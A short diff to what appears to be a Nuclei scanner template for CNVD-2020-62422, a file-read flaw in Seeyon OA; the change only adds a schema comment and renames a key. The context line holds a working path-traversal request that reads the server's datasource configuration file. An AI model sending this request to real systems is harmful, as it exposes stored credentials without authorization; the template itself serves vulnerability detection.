@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: CNVD-2020-62422
 info:
   name: Seeyon readfile(CNVD-2020-62422)
@@ -5,7 +6,7 @@ info:
   severity: medium
   reference: https://blog.csdn.net/m0_46257936/article/details/113150699
   tags: lfi,cnvd
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties"
